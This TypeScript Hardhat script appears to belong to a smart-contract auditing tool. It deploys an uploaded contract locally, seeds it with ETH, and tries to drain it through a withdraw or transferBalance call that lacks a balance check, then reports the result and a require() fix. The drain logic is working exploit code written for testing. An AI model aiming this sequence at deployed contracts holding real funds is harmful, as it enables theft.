import hre from "hardhat";
import path from "path";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";
import { seedVault } from "./seedVault";
import { analyzeInputValidation } from "./analyzeInputValidation";
import type { ContractAnalysis } from "./analysisTypes";

// Supported call patterns for the input-validation attack
type WithdrawVariant = "uint256" | "address_uint256";

function detectVariant(iface: any, fnName: string): WithdrawVariant | null {
  const fn = iface.getFunction(fnName);
  if (!fn) return null;
  if (fn.inputs.length === 1 && fn.inputs[0].type === "uint256") return "uint256";
  if (
    fn.inputs.length === 2 &&
    fn.inputs[0].type === "address" &&
    fn.inputs[1].type === "uint256"
  ) return "address_uint256";
  return null;
}

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  const fileName = process.env.UPLOADED_FILE_NAME;
  if (!contractName || !fileName) throw new Error("UPLOADED_CONTRACT_NAME and UPLOADED_FILE_NAME must be set");

  const startTime = Date.now();
  const signers   = await hre.ethers.getSigners();
  const [deployer, attacker] = signers;

  const fullyQualified = `contracts/uploaded/${fileName}.sol:${contractName}`;
  const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
  const victim = await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  const iface = (victim as any).interface;

  // Seed vault with pooled funds before attacking
  const seedFn = (() => {
    try { return process.env.ANALYSIS_JSON ? (JSON.parse(process.env.ANALYSIS_JSON) as ContractAnalysis).seedFn : null; }
    catch { return null; }
  })();
  await seedVault(victim, signers, seedFn);

  // ── AI-powered detection via ANALYSIS_JSON ──────────────────────────────────
  let withdrawFnName = "withdraw";
  let depositFnName  = "deposit";
  let withdrawVariant: WithdrawVariant | null = null;
  let usedAiAnalysis = false;

  const rawAnalysisJson = process.env.ANALYSIS_JSON;
  if (rawAnalysisJson) {
    try {
      const fullAnalysis = JSON.parse(rawAnalysisJson);
      const iv = fullAnalysis.inputvalidation;
      // support both old field names (withdrawFunction) and new (withdrawFn)
      const wFnObj = iv?.withdrawFn ?? iv?.withdrawFunction;
      const dFnObj = iv?.depositFn  ?? iv?.depositFunction;

      if (iv && typeof iv.found === "boolean" && iv.found === true && wFnObj && dFnObj) {
        withdrawFnName = wFnObj.name;
        depositFnName  = dFnObj.name;

        // Verify both functions exist in ABI and get the call variant
        const dFn = iface.getFunction(depositFnName);
        withdrawVariant = detectVariant(iface, withdrawFnName);

        if (withdrawVariant !== null && dFn !== null) {
          usedAiAnalysis = true;
          console.log(`[inputvalidation] AI analysis: withdraw=${withdrawFnName} (${withdrawVariant}), deposit=${depositFnName}`);
        } else {
          console.warn(`[inputvalidation] AI suggested ${withdrawFnName}/${depositFnName} but ABI check failed (variant=${withdrawVariant}, dFn=${!!dFn}) — trying fallback`);
        }
      } else if (iv && typeof iv.found === "boolean" && iv.found === false) {
        console.log(`[inputvalidation] AI: no input validation vulnerability detected`);
        // withdrawVariant stays null — will skip to "not applicable" result
      } else {
        throw new Error("Invalid or missing inputvalidation field");
      }
    } catch (e: any) {
      console.warn(`[inputvalidation] Could not parse ANALYSIS_JSON (${e.message}) — falling back to ABI detection`);
    }
  }

  // ── Static analysis fallback: reads source to find missing balance guards ──
  if (!usedAiAnalysis && withdrawVariant === null) {
    const sourcePath = path.join(__dirname, "../../contracts/uploaded", `${fileName}.sol`);
    try {
      const ivResult = analyzeInputValidation(sourcePath);
      if (ivResult.found && ivResult.withdrawFn && ivResult.depositFn) {
        withdrawFnName = ivResult.withdrawFn.name;
        depositFnName  = ivResult.depositFn.name;
        withdrawVariant = detectVariant(iface, withdrawFnName);
        if (withdrawVariant) {
          usedAiAnalysis = true;
          console.log(`[inputvalidation] Static analysis: withdraw=${withdrawFnName} (${withdrawVariant}), deposit=${depositFnName}`);
        }
      }
    } catch { /* source read failed — try ABI fallback */ }
  }

  // ── Legacy ABI fallback: scan for known function names ────────────────────
  if (!usedAiAnalysis && withdrawVariant === null) {
    // Check transferBalance(address, uint256) first — more likely to be missing a guard
    const dFn = iface.getFunction("deposit");
    const tbFn = iface.getFunction("transferBalance");
    if (tbFn !== null && dFn !== null) {
      const v = detectVariant(iface, "transferBalance");
      if (v === "address_uint256") {
        withdrawFnName  = "transferBalance";
        depositFnName   = "deposit";
        withdrawVariant = "address_uint256";
        console.log(`[inputvalidation] Fallback: transferBalance(address,uint256) + deposit()`);
      }
    }
    // Then check classic withdraw(uint256) + deposit()
    if (withdrawVariant === null) {
      const wFn = iface.getFunction("withdraw");
      if (wFn !== null && dFn !== null && wFn.inputs.length === 1 && wFn.inputs[0].type === "uint256") {
        withdrawFnName  = "withdraw";
        depositFnName   = "deposit";
        withdrawVariant = "uint256";
        console.log(`[inputvalidation] Fallback: withdraw(uint256) + deposit()`);
      }
    }
  }

  // ── No pattern matched ──────────────────────────────────────────────────────
  if (withdrawVariant === null) {
    const endTime = Date.now();
    const balance: bigint = await hre.ethers.provider.getBalance(victimAddress);
    const result = buildResult({
      contractName,
      contractAddress: victimAddress,
      attackType: "inputvalidation",
      targetFunction: "N/A",
      severity: "High",
      initialBalance: balance,
      finalBalance: balance,
      stolenAmount: 0n,
      startTime,
      endTime,
      transactions: [],
      timeline: [
        `${contractName} deployed`,
        usedAiAnalysis
          ? "AI: no input validation vulnerability detected"
          : "No withdraw(uint256) or transferBalance(address,uint256) pattern found",
      ],
      report: {
        vulnerabilityType: "Input Validation",
        affectedFunction: "N/A",
        explanation: "Contract does not have a detectable missing-balance-check pattern.",
        fix: "N/A",
      },
    });
    process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
    return;
  }

  // ── Seed vault with one more deposit so contract has ETH ───────────────────
  try {
    const dFnAbi = iface.getFunction(depositFnName);
    const depositArgs = dFnAbi?.inputs.length > 0 && dFnAbi.inputs[0].type === "uint256"
      ? [parseEther("5")]
      : [];
    await (victim as any).connect(deployer)[depositFnName](...depositArgs, { value: parseEther("5") });
  } catch { /* deposit may fail if already funded */ }

  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);

  // ── Build call args and execute attack ──────────────────────────────────────
  const t1 = Date.now();
  let attackSucceeded = false;
  let attackerAddress: string = attacker.address;

  if (withdrawVariant === "uint256") {
    // Classic pattern: use InputValidationAttacker contract to call withdraw(amount)
    // with attacker having 0 deposited balance
    const AttackerFactory = await hre.ethers.getContractFactory("InputValidationAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy();
    await attackerContract.waitForDeployment();
    attackerAddress = await attackerContract.getAddress();

    const callData = iface.encodeFunctionData(withdrawFnName, [initialBalance]);

    try {
      await (attackerContract as any).connect(attacker).attack(victimAddress, callData);
      attackSucceeded = true;
    } catch {
      // Attack reverted — contract correctly validates caller's balance
    }
  } else {
    // transferBalance(address, uint256) pattern: call directly from attacker EOA
    // Attacker has 0 in balances mapping — if no require check, the subtraction
    // would underflow (pre-0.8) or revert via arithmetic check (0.8+).
    try {
      await (victim as any).connect(attacker)[withdrawFnName](attacker.address, initialBalance);
      attackSucceeded = true;
    } catch {
      // Reverted — either 0.8+ arithmetic check caught the missing guard,
      // or the contract has an explicit require
    }
  }

  const endTime      = Date.now();
  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const stolenAmount: bigint = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
  const attackerBal: bigint  = await hre.ethers.provider.getBalance(attackerAddress);

  // Build function signature string for report
  const withdrawSig = withdrawVariant === "address_uint256"
    ? `${withdrawFnName}(address,uint256)`
    : `${withdrawFnName}(uint256)`;

  // For the address_uint256 variant, the call was: fn(attacker.address, initialBalance)
  const callDesc = withdrawVariant === "address_uint256"
    ? `${withdrawSig} with args (attacker, ${formatEther(initialBalance)} ETH) — caller has 0 deposited`
    : `${withdrawSig}(${formatEther(initialBalance)} ETH) — caller deposited 0`;

  // Explain why attack may be blocked in 0.8+ even with missing guard
  const missingGuardNote = withdrawVariant === "address_uint256"
    ? `${withdrawFnName}() is missing require(balances[msg.sender] >= amount). In Solidity < 0.8 this would cause an integer underflow, giving the attacker type(uint256).max balance. Solidity 0.8+ default arithmetic checking reverted the transaction — the code-level vulnerability (missing guard) is real and would be exploitable on older compilers.`
    : `${withdrawFnName}() does not verify the caller deposited the requested amount. Any address can attempt to withdraw the full vault balance without depositing.`;

  // Pattern is detected for address_uint256 variant even when 0.8+ blocks it —
  // the missing require() IS a real code-level vulnerability
  const patternDetected = attackSucceeded || withdrawVariant === "address_uint256";

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "inputvalidation",
    targetFunction: withdrawSig,
    severity: "High",
    initialBalance,
    finalBalance,
    stolenAmount,
    patternDetected,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: `Vault seeded with ETH via ${depositFnName}()`,
        from: deployer.address,
        to: victimAddress,
        value: formatEther(initialBalance),
        unit: "ETH",
        timestampMs: t1 - 100,
        balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
      },
      {
        step: 2,
        description: attackSucceeded
          ? `Attacker calls ${callDesc} — VULNERABLE`
          : `Attacker calls ${callDesc} — blocked`,
        from: attackerAddress,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
      },
    ],
    timeline: attackSucceeded
      ? [
          `${contractName} deployed`,
          `Vault seeded with ${formatEther(initialBalance)} ETH`,
          `Attacker called ${withdrawSig} without depositing`,
          "No balance check — VULNERABLE",
          `${formatEther(stolenAmount)} ETH drained`,
        ]
      : [
          `${contractName} deployed`,
          `Vault seeded with ${formatEther(initialBalance)} ETH`,
          `Attacker called ${withdrawSig} without depositing`,
          withdrawVariant === "address_uint256"
            ? "Missing require() detected — Solidity 0.8+ arithmetic blocked the underflow at runtime"
            : "Contract blocked the call — balance check is in place",
        ],
    report: {
      vulnerabilityType: "Input Validation",
      affectedFunction: withdrawSig,
      explanation: attackSucceeded
        ? missingGuardNote
        : withdrawVariant === "address_uint256"
          ? missingGuardNote + " Add an explicit require(balances[msg.sender] >= amount) to make the guard clear and compiler-version-independent."
          : `${withdrawSig} correctly validates caller balance — not vulnerable to this attack.`,
      fix: attackSucceeded || withdrawVariant === "address_uint256"
        ? `Add require(balances[msg.sender] >= amount, "Insufficient balance") before the subtraction in ${withdrawFnName}().`
        : "No fix needed — input validation is correctly implemented.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
